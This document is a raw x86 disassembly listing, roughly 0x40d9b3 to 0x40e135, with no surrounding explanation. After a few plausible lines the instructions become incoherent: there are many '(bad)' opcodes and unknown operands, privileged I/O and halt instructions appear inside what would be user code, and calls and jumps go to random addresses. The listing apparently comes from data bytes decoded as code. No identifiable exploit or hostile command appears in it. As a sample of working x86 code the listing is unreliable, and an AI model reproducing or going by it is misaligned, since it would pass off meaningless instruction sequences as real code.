  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x41073f5f]
  40da22:	add    BYTE PTR [ebx+0x7],al
  40da25:	inc    ecx
  40da26:	add    BYTE PTR [edi+0x7],al
  40da29:	inc    ecx
  40da2a:	add    BYTE PTR [ebx+0x7],cl
  40da2d:	inc    ecx
  40da2e:	add    BYTE PTR [edi+0x7],cl
  40da31:	inc    ecx
  40da32:	add    BYTE PTR [ebx+0x7],dl
  40da35:	inc    ecx
  40da36:	add    BYTE PTR [edi+0x7],dl
  40da39:	inc    ecx
  40da3a:	add    BYTE PTR [ebx+0x7],bl
  40da3d:	inc    ecx
  40da3e:	add    ah,dl
  40da40:	(bad)  
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi+0x40]
  40da4c:	mov    ?,WORD PTR [edi+0xe181a4]
  40da52:	add    BYTE PTR [edx],ah
  40da54:	pop    es
  40da55:	add    BYTE PTR [eax],al
  40da57:	jmp    0x3cf244f5
  40da5c:	ret    0xa323
  40da5f:	lods   al,BYTE PTR ds:[esi]
  40da60:	cwde   
  40da61:	mov    dh,BYTE PTR [ecx-0x4e]
  40da64:	jecxz  0x40daa8
  40da66:	not    BYTE PTR [edx-0x5b]
  40da69:	mov    ds,esi
  40da6b:	mov    ds:0xea8ee8c8,eax
  40da70:	and    BYTE PTR [edi+0x44],dh
  40da73:	scas   al,BYTE PTR es:[edi]
  40da74:	not    DWORD PTR [edi+0x394b9064]
  40da7a:	or     BYTE PTR gs:[eax],0xcc
  40da7e:	repnz les eax,FWORD PTR [ebx+0x3e4c44e]
  40da85:	fbld   TBYTE PTR [esi-0x15efd30a]
  40da8b:	jne    0x40da62
  40da8d:	pop    esi
  40da8e:	imul   BYTE PTR [eax]
  40da90:	pop    ss
  40da91:	hlt    
  40da92:	std    
  40da93:	pop    edx
  40da94:	sub    DWORD PTR [ecx+0x1c5c9e45],esi
  40da9a:	outs   dx,BYTE PTR ds:[esi]
  40da9b:	push   es
  40da9c:	push   es
  40da9d:	in     eax,dx
  40da9e:	sbb    edx,DWORD PTR [eax-0x392db7f7]
  40daa4:	mov    dl,0x29
  40daa6:	jecxz  0x40da50
  40daa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa9:	xchg   ebp,eax
  40daaa:	push   ds
  40daab:	mov    eax,ds:0x6c5f3ac1
  40dab0:	sbb    BYTE PTR [edi-0x11],ah
  40dab3:	mov    DWORD PTR [edi+0x6f80f41],eax
  40dab9:	int    0xd7
  40dabb:	aaa    
  40dabc:	sub    eax,0x73b31673
  40dac1:	push   ebp
  40dac2:	pusha  
  40dac3:	and    esi,ecx
  40dac5:	xchg   ebp,eax
  40dac6:	jp     0x40daa3
  40dac8:	daa    
  40dac9:	mov    bh,0x77
  40dacb:	mov    edx,0xd3261390
  40dad0:	aas    
  40dad1:	mov    ebp,0x7a9e1ead
  40dad6:	xor    eax,DWORD PTR [eax-0x3e]
  40dad9:	cs mov ebx,0x432d0912
  40dadf:	push   esi
  40dae0:	add    DWORD PTR [edx],0x9ded6303
  40dae6:	jns    0x40dadd
  40dae8:	mov    al,ds:0xb05f11e5
  40daed:	mov    al,0x57
  40daef:	(bad)  
  40daf0:	daa    
  40daf1:	add    al,0xb
  40daf3:	add    cl,BYTE PTR [edi]
  40daf5:	dec    edi
  40daf6:	or     al,0xaf
  40daf8:	or     al,0xb3
  40dafa:	sti    
  40dafb:	push   ds
  40dafc:	inc    ebp
  40dafd:	test   DWORD PTR [ecx+0x16051ed6],0x9e69d6a5
  40db07:	dec    eax
  40db08:	outs   dx,DWORD PTR ds:[esi]
  40db09:	mov    bh,0x2b
  40db0b:	sar    al,0xc6
  40db0e:	cmp    eax,0xb633ca3d
  40db13:	loop   0x40db5b
  40db15:	fild   WORD PTR [ebp-0x1a0e2063]
  40db1b:	jne    0x40dae2
  40db1d:	and    BYTE PTR [ebx],ah
  40db1f:	adc    DWORD PTR ds:0xc4e9e7dd,edx
  40db25:	sub    DWORD PTR [ebx-0x6c0efa77],esi
  40db2b:	and    bl,ch
  40db2d:	sbb    eax,0xf9ada781
  40db32:	pop    ss
  40db33:	idiv   ebx
  40db35:	pop    ecx
  40db36:	xchg   edx,eax
  40db37:	fnstenv ds:0xc844fde6
  40db3d:	xchg   edx,eax
  40db3e:	inc    ecx
  40db3f:	push   es
  40db40:	sbb    BYTE PTR [edx],0xa0
  40db43:	and    DWORD PTR [edi+0x67facb45],eax
  40db49:	and    bl,bl
  40db4b:	dec    esp
  40db4c:	ror    BYTE PTR [ebx+0x6d945755],cl
  40db52:	jle    0x40db2e
  40db54:	test   eax,0x781498a4
  40db59:	test   al,0x1e
  40db5b:	sbb    al,0xbc
  40db5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db5e:	adc    al,0x7b
  40db60:	test   BYTE PTR [edi],ch
  40db62:	push   edi
  40db63:	sub    eax,DWORD PTR [ecx-0x38147c8e]
  40db69:	push   es
  40db6a:	test   ecx,ebp
  40db6c:	bound  eax,QWORD PTR [esp+edx*2-0x480c4c72]
  40db73:	or     eax,0x24bc3799
  40db78:	nop
  40db79:	fild   DWORD PTR [edi+0x5fe0a61b]
  40db7f:	test   eax,0x4107f8b2
  40db84:	cwde   
  40db85:	lds    ecx,FWORD PTR [ecx+ebx*8+0x500eec32]
  40db8c:	mov    cl,0x5b
  40db8e:	cwde   
  40db8f:	fld    TBYTE PTR [ebp-0x6f4ca47]
  40db95:	jb     0x40db5e
  40db97:	aaa    
  40db98:	inc    edx
  40db99:	popa   
  40db9a:	out    0xb5,eax
  40db9c:	lock in eax,dx
  40db9e:	xlat   BYTE PTR ds:[ebx]
  40db9f:	fmulp  st(0),st
  40dba1:	xor    DWORD PTR [edx+0x10eef9b9],esp
  40dba7:	addr16 dec ebx
  40dba9:	push   ss
  40dbaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbab:	jns    0x40db72
  40dbad:	js     0x40dbcf
  40dbaf:	sub    BYTE PTR [esi],bl
  40dbb1:	and    edi,ebx
  40dbb3:	shr    BYTE PTR [ebp+0x78],cl
  40dbb6:	dec    edx
  40dbb7:	ror    BYTE PTR [esi+0x60ee85d4],1
  40dbbd:	sub    ebp,DWORD PTR ds:0x74fa8c62
  40dbc3:	dec    ebp
  40dbc4:	int    0xc3
  40dbc6:	cmc    
  40dbc7:	add    BYTE PTR [esi+edi*1],ah
  40dbca:	sub    al,0xe1
  40dbcc:	addr16 popa 
  40dbce:	jecxz  0x40dc42
  40dbd0:	dec    edi
  40dbd1:	ret    0xc66c
  40dbd4:	ins    DWORD PTR es:[edi],dx
  40dbd5:	push   0xa0b09427
  40dbda:	xor    al,0xfd
  40dbdc:	ja     0x40dc12
  40dbde:	sbb    DWORD PTR [esi+0x45d0789a],ebp
  40dbe4:	not    BYTE PTR [ebp-0x5e]
  40dbe7:	push   ds
  40dbe8:	add    cl,cl
  40dbea:	call   0x18a6:0x185b1de1
  40dbf1:	mov    al,ds:0xfe468cc9
  40dbf6:	mov    edx,0x59b53e26
  40dbfb:	dec    ebp
  40dbfc:	mov    eax,0x1c6be30a
  40dc01:	push   edx
  40dc02:	data16 out 0x74,al
  40dc05:	clc    
  40dc06:	add    eax,0x8f87092f
  40dc0b:	and    edi,DWORD PTR [ebp-0x63]
  40dc0e:	inc    di
  40dc10:	cmc    
  40dc11:	xor    cl,ch
  40dc13:	nop
  40dc14:	xor    ch,ch
  40dc16:	cmp    ebx,DWORD PTR [edx+eax*2]
  40dc19:	xchg   DWORD PTR [esi],eax
  40dc1b:	cwde   
  40dc1c:	add    edi,DWORD PTR [eax]
  40dc1e:	lods   al,BYTE PTR ds:[esi]
  40dc1f:	mov    WORD PTR [eax],ss
  40dc21:	sub    dl,BYTE PTR ds:0x36935a2f
  40dc27:	mov    edx,0xe74c7f6a
  40dc2c:	stc    
  40dc2d:	inc    edx
  40dc2e:	nop
  40dc2f:	ins    BYTE PTR es:[edi],dx
  40dc30:	iret   
  40dc31:	inc    esp
  40dc32:	mov    dh,0xb5
  40dc34:	and    eax,0x516b0bff
  40dc39:	sub    eax,0x576abe43
  40dc3e:	sub    eax,DWORD PTR [edx]
  40dc40:	dec    ebp
  40dc41:	add    edx,DWORD PTR [ebp-0x4d811418]
  40dc47:	jmp    0x40dbd9
  40dc49:	dec    eax
  40dc4a:	daa    
  40dc4b:	(bad)  
  40dc4c:	push   0x5a
  40dc4e:	jns    0x40dc8c
  40dc50:	lea    ebp,[ecx-0x64e937c6]
  40dc56:	cmp    al,0xdf
  40dc58:	js     0x40dc35
  40dc5a:	addr16 dec ebx
  40dc5c:	shl    BYTE PTR [ebp+0x6447bf34],1
  40dc62:	adc    eax,0xa4a03459
  40dc67:	fadd   DWORD PTR cs:[ebp+0x2901fade]
  40dc6e:	iret   
  40dc6f:	js     0x40dc3f
  40dc71:	inc    esp
  40dc72:	in     al,dx
  40dc73:	repnz addr16 aad 0x17
  40dc77:	xor    BYTE PTR [edi-0x42b96b49],bh
  40dc7d:	into   
  40dc7e:	mov    ds,WORD PTR [eax]
  40dc80:	inc    edx
  40dc81:	dec    esp
  40dc82:	xchg   ah,bh
  40dc84:	out    0xb2,eax
  40dc86:	mov    BYTE PTR [ecx+0x3e],bl
  40dc89:	cld    
  40dc8a:	leave  
  40dc8b:	pop    edi
  40dc8c:	cmp    BYTE PTR [edi-0x198008bb],bl
  40dc92:	retf   0xe0f1
  40dc95:	cmp    BYTE PTR [edi],dl
  40dc97:	pop    esi
  40dc98:	mov    dl,0xee
  40dc9a:	dec    esp
  40dc9b:	mov    cl,0x93
  40dc9d:	and    BYTE PTR [eax+0x7626111d],bh
  40dca3:	mov    ebx,DWORD PTR [ebx]
  40dca5:	pushf  
  40dca6:	xor    DWORD PTR ds:0xbb36dc90,eax
  40dcac:	scas   al,BYTE PTR es:[edi]
  40dcad:	push   0x13
  40dcaf:	xchg   BYTE PTR [esi-0x33],bh
  40dcb2:	xchg   edx,eax
  40dcb3:	adc    cl,BYTE PTR [esi+0x4b3c5b48]
  40dcb9:	xor    edx,edx
  40dcbb:	das    
  40dcbc:	test   edx,ebx
  40dcbe:	je     0x40dcd9
  40dcc0:	mov    eax,0x330e67e1
  40dcc5:	push   ebp
  40dcc6:	mov    ds:0x4723947c,al
  40dccb:	out    dx,eax
  40dccc:	loopne 0x40dc84
  40dcce:	popa   
  40dccf:	jle    0x40dce2
  40dcd1:	cmp    al,0xdd
  40dcd3:	mov    DWORD PTR [esi],ecx
  40dcd5:	push   edi
  40dcd6:	push   0x9623291b
  40dcdb:	pop    es
  40dcdc:	mov    ch,0xf3
  40dcde:	mov    ecx,0x30177eb4
  40dce3:	frstor ds:[esi-0x435a2fdb]
  40dcea:	shl    BYTE PTR [ecx+0x5d],1
  40dced:	dec    edi
  40dcee:	jo     0x40dc72
  40dcf0:	out    dx,eax
  40dcf1:	xor    DWORD PTR [di],0x9e9e21f4
  40dcf8:	aad    0x56
  40dcfa:	ins    BYTE PTR es:[edi],dx
  40dcfb:	js     0x40dce5
  40dcfd:	push   edx
  40dcfe:	push   ebp
  40dcff:	pop    ebp
  40dd00:	fcomp  QWORD PTR [edx+0x4a66bb0d]
  40dd06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd07:	cmc    
  40dd08:	mov    bh,0x7c
  40dd0a:	mov    WORD PTR [edi+0xa],?
  40dd0d:	sbb    ah,BYTE PTR [edi-0x4a]
  40dd10:	adc    DWORD PTR [esi-0x6389a26b],edi
  40dd16:	push   esp
  40dd17:	dec    edi
  40dd18:	aam    0xee
  40dd1a:	std    
  40dd1b:	and    al,al
  40dd1d:	rol    esp,1
  40dd1f:	fdivr  QWORD PTR [eax+0x5f570e48]
  40dd25:	cmovg  edx,ebx
  40dd28:	and    al,BYTE PTR [eax]
  40dd2a:	jge    0x40dd9e
  40dd2c:	ds int3 
  40dd2e:	out    0xcc,eax
  40dd30:	retf   
  40dd31:	(bad)  [edi+0x356d2da3]
  40dd37:	jle    0x40dda5
  40dd39:	mov    bh,0x4d
  40dd3b:	es pop eax
  40dd3d:	mov    edi,0xb697fd61
  40dd42:	sub    BYTE PTR [ebp-0x4b6ed5ce],al
  40dd48:	or     eax,0x62db8f8f
  40dd4d:	sbb    dh,BYTE PTR [ebx]
  40dd4f:	xor    esp,ecx
  40dd51:	push   es
  40dd52:	pop    ecx
  40dd53:	leave  
  40dd54:	xchg   esp,eax
  40dd55:	je     0x40ddc2
  40dd57:	sub    BYTE PTR [ebx+esi*2],0x2
  40dd5b:	and    ebp,DWORD PTR [edi]
  40dd5d:	cld    
  40dd5e:	loop   0x40dd89
  40dd60:	popf   
  40dd61:	mov    bl,0xb4
  40dd63:	jmp    0x9e8b2d0b
  40dd68:	test   ebx,ebx
  40dd6a:	cmp    cl,ah
  40dd6c:	stc    
  40dd6d:	ins    DWORD PTR es:[edi],dx
  40dd6e:	push   ss
  40dd6f:	rol    BYTE PTR [edi+0x38],0x5
  40dd73:	sti    
  40dd74:	mov    ?,WORD PTR [eax]
  40dd76:	mov    edi,0x8e7991eb
  40dd7b:	jnp    0x40ddc4
  40dd7d:	loop   0x40dd52
  40dd7f:	and    ebx,edi
  40dd81:	dec    eax
  40dd82:	push   cs
  40dd83:	fisubr WORD PTR [ebx+0x49ea4fef]
  40dd89:	enter  0xd18e,0x37
  40dd8d:	call   0xc6b048b1
  40dd92:	jge    0x40dd92
  40dd94:	je     0x40dd67
  40dd96:	xchg   esi,eax
  40dd97:	xlat   BYTE PTR ds:[ebx]
  40dd98:	aas    
  40dd99:	xchg   esp,eax
  40dd9a:	in     eax,0x49
  40dd9c:	lahf   
  40dd9d:	out    0x6a,al
  40dd9f:	jle    0x40dd9d
  40dda1:	inc    edi
  40dda2:	sub    cl,BYTE PTR [esi]
  40dda4:	(bad)  
  40dda5:	loope  0x40ddac
  40dda7:	adc    al,0xc9
  40dda9:	pop    esp
  40ddaa:	xchg   BYTE PTR ds:0xabbdb3e5,ah
  40ddb0:	and    bl,al
  40ddb2:	(bad)  [eax-0x25bfc5a2]
  40ddb8:	ficom  DWORD PTR [ecx+edi*8]
  40ddbb:	mov    ah,0xa3
  40ddbd:	retf   0xdce7
  40ddc0:	sbb    bl,BYTE PTR [edi]
  40ddc2:	inc    ebx
  40ddc3:	add    ebx,DWORD PTR [ecx-0x79cefca9]
  40ddc9:	test   esp,0xdc816860
  40ddcf:	in     al,0xa3
  40ddd1:	cmp    dl,dh
  40ddd3:	adc    esp,DWORD PTR [edx]
  40ddd5:	and    DWORD PTR [esi-0x315aa60b],esi
  40dddb:	and    al,0x29
  40dddd:	jbe    0x40ddd1
  40dddf:	test   BYTE PTR ds:0xf1febcd7,0xc3
  40dde6:	imul   eax,DWORD PTR [ebx+eiz*4],0x628a4c85
  40dded:	cmp    al,0x25
  40ddef:	cld    
  40ddf0:	out    dx,eax
  40ddf1:	(bad)  
  40ddf2:	loope  0x40dd9b
  40ddf4:	dec    esp
  40ddf5:	mov    dh,0x57
  40ddf7:	jle    0x40dd9a
  40ddf9:	inc    ebp
  40ddfa:	xor    al,0x49
  40ddfc:	popa   
  40ddfd:	ja     0x40dde7
  40ddff:	clc    
  40de00:	or     BYTE PTR [edi-0xe],bl
  40de03:	aas    
  40de04:	ss add ah,cl
  40de07:	dec    eax
  40de08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de09:	fwait
  40de0a:	cwde   
  40de0b:	jno    0x40ddfe
  40de0d:	push   0xea3f8c68
  40de12:	xor    al,0x11
  40de14:	or     eax,0xfefab631
  40de19:	(bad)  
  40de1a:	scas   eax,DWORD PTR es:[edi]
  40de1b:	jnp    0x40de5d
  40de1d:	sbb    dl,BYTE PTR [ecx]
  40de1f:	repnz xor DWORD PTR [ebx+edx*4],esi
  40de23:	cmp    bl,dh
  40de25:	call   0xd0429410
  40de2a:	test   DWORD PTR [edx+eiz*2+0x57],0xa9b642d6
  40de32:	mov    edi,0xedf2c44
  40de37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de38:	xchg   edi,eax
  40de39:	dec    ecx
  40de3a:	xchg   ebp,eax
  40de3b:	mov    al,cl
  40de3d:	inc    ebp
  40de3e:	popa   
  40de3f:	push   esp
  40de40:	data16 loope 0x40ddea
  40de43:	add    DWORD PTR ss:[ebp-0x2fdce9a5],0x39
  40de4b:	mov    bh,0xd7
  40de4d:	out    0x83,al
  40de4f:	xor    DWORD PTR ds:0xf9510541,esp
  40de55:	loopne 0x40de0d
  40de57:	pop    ds
  40de58:	ret    0xfc48
  40de5b:	les    ebx,FWORD PTR [ebp+0x3b90f93e]
  40de61:	pusha  
  40de62:	iret   
  40de63:	jp     0x40dde7
  40de65:	hlt    
  40de66:	das    
  40de67:	dec    esi
  40de68:	and    BYTE PTR [eax],bl
  40de6a:	push   ebp
  40de6b:	inc    ecx
  40de6c:	sub    al,0xb5
  40de6e:	test   DWORD PTR [ebx+0x76],ebx
  40de71:	lea    esp,[ecx-0x3f072b01]
  40de77:	popa   
  40de78:	js     0x40de36
  40de7a:	jno    0x40de05
  40de7c:	pop    esp
  40de7d:	push   edx
  40de7e:	das    
  40de7f:	pop    edx
  40de80:	sbb    al,0x5e
  40de82:	mov    fs,WORD PTR [ebx+0x330df55b]
  40de88:	fs ds gs enter 0x4202,0xd5
  40de8f:	ror    DWORD PTR [esi+esi*4+0x60],cl
  40de93:	je     0x40deb0
  40de95:	stc    
  40de96:	pop    ss
  40de97:	cmc    
  40de98:	dec    edx
  40de99:	(bad)  
  40de9a:	in     eax,dx
  40de9b:	mov    esi,0xe1811340
  40dea0:	arpl   WORD PTR [esi-0x78434a80],di
  40dea6:	shl    cl,cl
  40dea8:	push   ebp
  40dea9:	push   0xd2906764
  40deae:	xlat   BYTE PTR ds:[ebx]
  40deaf:	and    DWORD PTR [edx],0xb3048c0d
  40deb5:	inc    esp
  40deb6:	arpl   WORD PTR [ecx],sp
  40deb8:	xchg   ebx,ebp
  40deba:	jnp    0x40dee5
  40debc:	jns    0x40df35
  40debe:	adc    al,0xc1
  40dec0:	pop    ds
  40dec1:	adc    edx,DWORD PTR [eax]
  40dec3:	adc    al,0x18
  40dec5:	(bad)  
  40dec7:	test   esp,0x74f8e501
  40decd:	adc    BYTE PTR [eax-0x1a624eae],0xaa
  40ded4:	or     eax,0x7db6b218
  40ded9:	in     al,dx
  40deda:	aad    0x6b
  40dedc:	push   ecx
  40dedd:	ret    0xf123
  40dee0:	pop    ds
  40dee1:	outs   dx,BYTE PTR ds:[esi]
  40dee2:	mov    edi,DWORD PTR [ecx+0x22]
  40dee5:	sub    eax,0xd56ac406
  40deea:	and    edi,DWORD PTR [ebp+0x73]
  40deed:	xchg   edi,eax
  40deee:	adc    BYTE PTR [ebp-0x4f966f2f],bh
  40def4:	dec    edx
  40def5:	inc    ebp
  40def6:	test   eax,0x2c8544c6
  40defb:	out    0x85,al
  40defd:	jno    0x40de89
  40deff:	xor    ecx,DWORD PTR [edi-0x61]
  40df02:	cmp    cl,bl
  40df04:	cmp    ebx,DWORD PTR [edx-0x6b]
  40df07:	ret    0x234b
  40df0a:	lock sbb eax,0xd3dc41b5
  40df10:	imul   edi,DWORD PTR [ecx+0x363a7497],0x67
  40df17:	push   edx
  40df18:	xchg   ebp,eax
  40df19:	push   eax
  40df1a:	or     BYTE PTR [edx+0x74c14c12],cl
  40df20:	inc    esi
  40df21:	loop   0x40dec3
  40df23:	call   0x4b097d55
  40df28:	xchg   ecx,eax
  40df29:	rcl    ah,cl
  40df2b:	push   0x98bdd51
  40df30:	retf   0x5d4b
  40df33:	mov    edi,0xb32d6c78
  40df38:	ins    BYTE PTR es:[edi],dx
  40df39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df3a:	jnp    0x40df7a
  40df3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df3d:	(bad)  
  40df3e:	cmc    
  40df3f:	icebp  
  40df40:	bsr    edx,DWORD PTR [ebp+0x6d515568]
  40df47:	mov    al,cl
  40df49:	ds hlt 
  40df4b:	cmp    BYTE PTR [ebp-0x748a76ca],dh
  40df51:	push   ebp
  40df52:	cli    
  40df53:	push   0xfacbdef0
  40df58:	lods   al,BYTE PTR ds:[esi]
  40df59:	sar    DWORD PTR cs:[eax],0x45
  40df5d:	xchg   esi,eax
  40df5e:	pop    ebx
  40df5f:	xor    al,0xf5
  40df61:	stc    
  40df62:	inc    ebp
  40df63:	push   ds
  40df64:	aam    0x1
  40df66:	lahf   
  40df67:	dec    eax
  40df68:	(bad)  
  40df69:	xor    al,0xb3
  40df6b:	fwait
  40df6c:	cmc    
  40df6d:	pop    ecx
  40df6e:	sbb    eax,0x3472acce
  40df73:	and    bl,ah
  40df75:	mov    ds:0x62c9e77d,eax
  40df7a:	sub    edi,eax
  40df7c:	out    dx,eax
  40df7d:	xchg   esi,eax
  40df7e:	rol    BYTE PTR [edx+0x3e9824df],0x0
  40df85:	xchg   ebx,eax
  40df86:	mov    dl,0xdf
  40df88:	jne    0x40df50
  40df8a:	aad    0x1c
  40df8c:	out    dx,eax
  40df8d:	ficomp DWORD PTR [edx+ebx*4+0x5a]
  40df91:	xor    al,0x14
  40df93:	jle    0x40dfa4
  40df95:	pop    ebp
  40df96:	inc    ebx
  40df97:	scas   eax,DWORD PTR es:[edi]
  40df98:	add    eax,0x77150b0b
  40df9d:	jl     0x40e008
  40df9f:	inc    edi
  40dfa0:	rcr    DWORD PTR [ecx-0x54],cl
  40dfa3:	dec    esp
  40dfa4:	cwde   
  40dfa5:	sbb    ebx,DWORD PTR [ecx+eiz*4-0x1d]
  40dfa9:	dec    edi
  40dfaa:	inc    esi
  40dfab:	sub    eax,0xd6596bd2
  40dfb0:	jnp    0x40dfed
  40dfb2:	push   ecx
  40dfb3:	jb     0x40dff2
  40dfb5:	push   ds
  40dfb6:	or     BYTE PTR [esi],ch
  40dfb8:	dec    ebp
  40dfb9:	cmp    eax,0x5dfde882
  40dfbe:	stos   DWORD PTR es:[edi],eax
  40dfbf:	int3   
  40dfc0:	sub    dh,dl
  40dfc2:	imul   ebx,DWORD PTR [esi+0x68],0x96f1693b
  40dfc9:	sub    DWORD PTR [esi-0x79d0ee06],0x74
  40dfd0:	mov    edx,0xdf261044
  40dfd5:	mov    esi,0x786b83d2
  40dfda:	push   eax
  40dfdb:	outs   dx,BYTE PTR ds:[esi]
  40dfdc:	add    al,BYTE PTR [edx]
  40dfde:	lods   al,BYTE PTR ds:[esi]
  40dfdf:	ins    DWORD PTR es:[edi],dx
  40dfe0:	les    eax,FWORD PTR [edi+edx*4+0x69c8560d]
  40dfe7:	sub    al,0x6a
  40dfe9:	sub    BYTE PTR [ecx-0x3e3abb4d],cl
  40dfef:	aam    0xea
  40dff1:	sub    ch,cl
  40dff3:	(bad)  
  40dff5:	push   cs
  40dff6:	add    ebp,esp
  40dff8:	rcl    BYTE PTR [edi-0x2e199f40],cl
  40dffe:	pop    ebp
  40dfff:	daa    
  40e000:	cmc    
  40e001:	adc    eax,DWORD PTR [ebx-0x481ea358]
  40e007:	xor    bh,BYTE PTR [ecx]
  40e009:	into   
  40e00a:	adc    DWORD PTR [esi],ebp
  40e00c:	ds jmp 0x9f7e1689
  40e012:	loop   0x40dfed
  40e014:	xor    al,0xa3
  40e016:	sbb    bl,dh
  40e018:	jmp    0x40dfef
  40e01a:	lods   eax,DWORD PTR ds:[esi]
  40e01b:	xlat   BYTE PTR ds:[ebx]
  40e01c:	or     al,0xff
  40e01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e01f:	mov    esi,0x5b7aae4e
  40e024:	rcr    edi,1
  40e026:	sbb    esi,eax
  40e028:	gs ins DWORD PTR es:[edi],dx
  40e02a:	and    al,0xc7
  40e02c:	mov    BYTE PTR [esi-0x11],dl
  40e02f:	dec    ecx
  40e030:	mov    edi,ebp
  40e032:	and    bl,BYTE PTR [eax+0x54]
  40e035:	mov    DWORD PTR [ebp+0x7d65ed6b],ecx
  40e03b:	push   edx
  40e03c:	mov    eax,0xcdd8bf44
  40e041:	into   
  40e042:	scas   eax,DWORD PTR es:[edi]
  40e043:	neg    DWORD PTR [ebx]
  40e045:	data16 out 0x7f,al
  40e048:	add    al,0x4a
  40e04b:	cmc    
  40e04c:	rcr    DWORD PTR [ecx-0x49],cl
  40e04f:	daa    
  40e050:	mov    al,0x88
  40e052:	push   0xffffff81
  40e054:	xor    BYTE PTR [ebx],0x6
  40e057:	jb     0x40e051
  40e059:	push   ss
  40e05a:	pop    ss
  40e05b:	pop    edx
  40e05c:	fnstcw WORD PTR [ecx+0x64]
  40e05f:	sub    eax,0x48fea212
  40e064:	jae    0x40e099
  40e066:	xor    al,BYTE PTR [ebx]
  40e068:	ss icebp 
  40e06a:	or     al,0xdf
  40e06c:	es dec ebx
  40e06e:	mov    ah,0x4f
  40e070:	popf   
  40e071:	(bad)  
  40e072:	mov    ah,0xb3
  40e074:	stc    
  40e075:	mov    ecx,0x76758646
  40e07a:	add    al,0xae
  40e07c:	mov    bh,0x6b
  40e07e:	push   0xb36e7131
  40e083:	xor    BYTE PTR [edi-0x1a],ch
  40e086:	lods   eax,DWORD PTR ds:[esi]
  40e087:	pusha  
  40e088:	push   edi
  40e089:	bound  esi,QWORD PTR [edx-0x22]
  40e08c:	and    eax,0xce48ed8f
  40e091:	mov    ebx,0xd5428d81
  40e096:	or     dh,ch
  40e098:	rcr    edx,0xad
  40e09b:	je     0x40e0db
  40e09d:	out    dx,al
  40e09e:	fidivr WORD PTR [ecx+0x7c]
  40e0a1:	lock sbb esp,DWORD PTR [esi-0x13]
  40e0a5:	test   BYTE PTR [eax],ah
  40e0a7:	lds    esi,FWORD PTR [eax-0x5f]
  40e0aa:	out    0xff,eax
  40e0ac:	push   DWORD PTR [eax]
  40e0ae:	cmp    BYTE PTR [eax-0x3caf3815],dl
  40e0b4:	mov    ebp,0x171eee86
  40e0b9:	(bad)  
  40e0ba:	call   DWORD PTR [eax-0x4f6deaef]
  40e0c0:	and    DWORD PTR [esp+edi*4-0x3eb9afad],edi
  40e0c7:	pop    esp
  40e0c8:	fs adc dh,bl
  40e0cb:	sbb    DWORD PTR [edx],ebp
  40e0cd:	inc    edx
  40e0ce:	inc    eax
  40e0cf:	mov    dl,0x4
  40e0d1:	mov    WORD PTR [edi-0x36],?
  40e0d4:	leave  
  40e0d5:	push   ebx
  40e0d6:	inc    esp
  40e0d7:	mov    eax,ds:0x865d0017
  40e0dc:	pop    ss
  40e0dd:	sbb    esi,DWORD PTR [edi-0x52]
  40e0e0:	(bad)  
  40e0e2:	mov    ch,0xc3
  40e0e4:	fldenv [eax]
  40e0e6:	pop    edx
  40e0e7:	mov    bl,0x56
  40e0e9:	stos   BYTE PTR es:[edi],al
  40e0ea:	mov    al,0x74
  40e0ec:	cwde   
  40e0ed:	jnp    0x40e0c2
  40e0ef:	fdiv   QWORD PTR [eax+0x26]
  40e0f2:	cmp    dh,BYTE PTR [ebx+0xbddbb4]
  40e0f8:	or     dl,ch
  40e0fa:	and    al,0x49
  40e0fc:	mov    al,0x90
  40e0fe:	call   0x25292d24
  40e103:	mov    esi,0x2b4dc814
  40e108:	lods   eax,DWORD PTR ds:[esi]
  40e109:	scas   al,BYTE PTR es:[edi]
  40e10a:	ss inc eax
  40e10c:	shl    BYTE PTR [ebx],0x42
  40e10f:	add    DWORD PTR [ebp+0xdbe4907],ebp
  40e115:	xor    BYTE PTR [ebx+ecx*8+0x1cbe9a10],0x28
  40e11d:	ins    BYTE PTR es:[edi],dx
  40e11e:	clc    
  40e11f:	dec    esi
  40e120:	jno    0x40e11c
  40e122:	mov    eax,0xb5884124
  40e127:	js     0x40e0c7
  40e129:	or     eax,0xce5ac1d2
  40e12e:	fwait
  40e12f:	cli    
  40e130:	cmp    eax,0x4ce394ca
  40e135:	mov    cl,0xe6
